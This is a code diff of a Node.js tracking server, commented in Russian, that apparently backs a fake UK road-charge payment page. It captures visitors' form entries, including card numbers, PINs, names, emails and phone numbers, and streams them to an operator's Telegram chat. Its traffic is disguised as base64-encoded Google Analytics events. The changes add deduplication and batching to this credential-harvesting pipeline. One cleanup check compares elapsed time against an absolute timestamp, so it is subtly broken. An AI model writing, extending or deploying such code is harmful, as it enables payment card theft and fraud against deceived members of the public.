@@ -71,6 +71,22 @@ setInterval(() => {
   for (const [sessionId, session] of activeSessions.entries()) {
     if (now - session.startTime > SESSION_TIMEOUT) {
       activeSessions.delete(sessionId);
+      // Очистить дедупликацию для этой сессии
+      eventDeduplication.delete(sessionId);
+    }
+  }
+  
+  // Очистить старые записи дедупликации (старше 1 часа)
+  const oneHourAgo = now - (60 * 60 * 1000);
+  for (const [sessionId, sessionEvents] of eventDeduplication.entries()) {
+    if (!activeSessions.has(sessionId)) {
+      eventDeduplication.delete(sessionId);
+      continue;
+    }
+    for (const [eventKey, timestamp] of sessionEvents.entries()) {
+      if (now - timestamp > oneHourAgo) {
+        sessionEvents.delete(eventKey);
+      }
     }
   }
 }, 60 * 1000);
@@ -234,6 +250,9 @@ function getFieldNameRu(fieldCode) {
     'vrn': '🚗 Номер авто',
     'pin': '🔢 PIN код',
     'notice': '📄 Notice Number',
+    'journey': '🛣️ Journeys to Pay',
+    'journey_ref': '🛣️ Journey Reference',
+    'journey_reference': '🛣️ Journey Reference',
     'em': '📧 Email',
     'email': '📧 Email',
     'cd': '💳 Номер карты',
@@ -244,6 +263,8 @@ function getFieldNameRu(fieldCode) {
     'nm': '👤 Имя владельца',
     'ph': '📱 Телефон',
     'phone': '📱 Телефон',
+    'ot': '📝 Другое поле',
+    'amount': '💶 Сумма',
   };
   
   return fieldNames[fieldCode] || fieldNames[fieldCode.toLowerCase()] || `📝 ${fieldCode}`;
@@ -291,7 +312,7 @@ async function formatTelegramMessage(sessionId, visitorId) {
       message += `ОС: <code>${escapeHtml(visitor.os)}</code>\n`;
     }
     if (visitor.country && visitor.country !== 'Unknown') {
-      message += `Страна: <code>${escapeHtml(visitor.country)}</code>\n`;
+      message += `Страна посещения: <code>${escapeHtml(visitor.country)}</code>\n`;
     }
     
     message += `\n<b>Движение клиента:</b>\n`;
@@ -320,6 +341,7 @@ async function formatTelegramMessage(sessionId, visitorId) {
             
           case 'form_fill':
           case 'form_input':
+          case 'form_complete':
             if (action.field_name) {
               const fieldName = getFieldNameRu(action.field_name);
               const fieldValue = action.field_value ? escapeHtml(action.field_value.substring(0, 50)) : '';
@@ -402,6 +424,56 @@ function isSuspiciousPath(path) {
   return SUSPICIOUS_PATHS.some(pattern => pattern.test(path));
 }
 
+// Дедупликация событий: sessionId -> Set<eventKey>
+const eventDeduplication = new Map();
+const DEDUP_WINDOW = 3000; // 3 секунды
+
+/**
+ * Создать ключ для дедупликации события
+ */
+function getEventKey(eventData) {
+  const type = eventData.type || 'unknown';
+  const field = eventData.field || '';
+  const value = eventData.value || '';
+  const buttonText = eventData.buttonText || eventData.button_text || '';
+  const path = eventData.path || '';
+  
+  // Для page_view учитываем путь, для остальных - тип+поле+значение
+  if (type === 'page_view' || type === 'navigation') {
+    return `${type}:${path}`;
+  }
+  
+  return `${type}:${field}:${value || buttonText}`;
+}
+
+/**
+ * Проверить является ли событие дубликатом
+ */
+function isDuplicateEvent(sessionId, eventKey) {
+  if (!eventDeduplication.has(sessionId)) {
+    eventDeduplication.set(sessionId, new Map());
+  }
+  
+  const sessionEvents = eventDeduplication.get(sessionId);
+  const now = Date.now();
+  
+  // Очистить старые события
+  for (const [key, timestamp] of sessionEvents.entries()) {
+    if (now - timestamp > DEDUP_WINDOW) {
+      sessionEvents.delete(key);
+    }
+  }
+  
+  // Проверить дубликат
+  if (sessionEvents.has(eventKey)) {
+    return true; // Дубликат
+  }
+  
+  // Сохранить новое событие
+  sessionEvents.set(eventKey, now);
+  return false; // Не дубликат
+}
+
 /**
  * Отследить событие (действие пользователя)
  */
@@ -411,6 +483,17 @@ async function trackEvent(sessionId, eventData, meta = {}) {
     const activeSession = activeSessions.get(sessionId);
     if (!activeSession) {
       return;
+    }
+    
+    // ДЕДУПЛИКАЦИЯ: Пропустить дубликаты
+    const eventKey = getEventKey(eventData);
+    if (isDuplicateEvent(sessionId, eventKey)) {
+      return; // Пропустить дубликат
+    }
+    
+    // Пропустить повторные page_view на той же странице
+    if (eventData.type === 'page_view' && eventData.path === activeSession.lastPage) {
+      return; // Уже на этой странице
     }
     
     // Добавить действие в БД
@@ -437,10 +520,15 @@ async function trackEvent(sessionId, eventData, meta = {}) {
     activeSession.actionCount++;
     activeSession.lastPage = eventData.path || activeSession.lastPage;
     
-    // Обновить сообщение в Telegram
-    const messageText = await formatTelegramMessage(sessionId, activeSession.visitorId);
-    if (messageText && activeSession.messageId) {
-      await editTelegramMessage(activeSession.messageId, messageText);
+    // Обновить сообщение в Telegram (с задержкой для батчинга)
+    if (!activeSession.updateTimer) {
+      activeSession.updateTimer = setTimeout(async () => {
+        activeSession.updateTimer = null;
+        const messageText = await formatTelegramMessage(sessionId, activeSession.visitorId);
+        if (messageText && activeSession.messageId) {
+          await editTelegramMessage(activeSession.messageId, messageText);
+        }
+      }, 500); // Батчинг: обновляем раз в 500мс
     }
     
   } catch (error) {
@@ -491,13 +579,17 @@ async function trackPageRequest(req) {
     // Получить информацию об устройстве
     const deviceInfo = await deviceDetector.getFullDeviceInfo(ip, userAgent);
     
-    // Получить или создать посетителя
+    // Проверить есть ли активная сессия (до создания посетителя)
+    let activeSession = activeSessions.get(sessionId);
+    const isNewSession = !activeSession;
+    
+    // Получить или создать посетителя (увеличить visit_count только при новой сессии)
     const visitorId = db.getOrCreateVisitor(ip, userAgent, {
       deviceType: deviceInfo.deviceType,
       browser: deviceInfo.browser,
       os: deviceInfo.os,
       isBot: isBot(userAgent)
-    });
+    }, isNewSession); // incrementVisit = true только для новой сессии
     
     // Обновить информацию о стране/городе если есть
     if (deviceInfo.country && deviceInfo.country !== 'Unknown') {
@@ -511,9 +603,6 @@ async function trackPageRequest(req) {
         logger.error('[TG] Failed to update visitor country:', error.message);
       }
     }
-    
-    // Проверить есть ли активная сессия
-    let activeSession = activeSessions.get(sessionId);
     
     if (!activeSession) {
       // Создать новую сессию в БД
@@ -664,20 +753,39 @@ async function handleAnalyticsAPI(req, res) {
         const decoded = Buffer.from(encodedData, 'base64').toString('utf8');
         const gaData = JSON.parse(decoded);
         
-        // Конвертировать в внутренний формат (используем старую функцию decodeGAEvent из старого файла)
-        // Для упрощения, здесь можно использовать упрощенную версию
-        const internalData = {
-          type: gaData.ec === 'payment' && gaData.ea === 'button_click' ? 'pay_button_click' :
-                gaData.ec === 'form' && gaData.ea === 'complete' ? 'form_fill' :
-                gaData.ec === 'form' && gaData.ea === 'focus' ? 'form_input' :
-                gaData.ec === 'ui' && gaData.ea === 'click' ? 'button_click' :
-                'page_view',
+        // Конвертировать в внутренний формат
+        let internalData = {
+          type: 'unknown',
           path: gaData.pg || gaData.ev || '',
           page: gaData.pg || '',
           field: gaData.el || '',
           value: gaData.ev || '',
-          buttonText: gaData.ev || ''
+          buttonText: ''
         };
+        
+        // Определить тип события
+        if (gaData.ec === 'payment' && (gaData.ea === 'button_click' || gaData.ea === 'form_submit')) {
+          internalData.type = 'pay_button_click';
+          internalData.buttonText = gaData.ev || 'Pay';
+        } else if (gaData.ec === 'form' && gaData.ea === 'complete') {
+          internalData.type = 'form_fill';
+          internalData.field = gaData.el || '';
+          internalData.value = gaData.ev || '';
+        } else if (gaData.ec === 'form' && gaData.ea === 'focus') {
+          internalData.type = 'form_input';
+          internalData.field = gaData.el || '';
+        } else if (gaData.ec === 'ui' && gaData.ea === 'click') {
+          internalData.type = 'button_click';
+          internalData.buttonText = gaData.ev || 'Button';
+        } else if (gaData.ec === 'page' && gaData.ea === 'view') {
+          internalData.type = 'page_view';
+          internalData.path = gaData.ev || gaData.pg || '';
+        } else if (gaData.ec === 'checkout' && gaData.ea === 'step') {
+          internalData.type = 'navigation';
+          internalData.page = gaData.el || '';
+        } else {
+          internalData.type = 'unknown';
+        }
         
         await trackEvent(sessionId, internalData, { ip, userAgent });
         
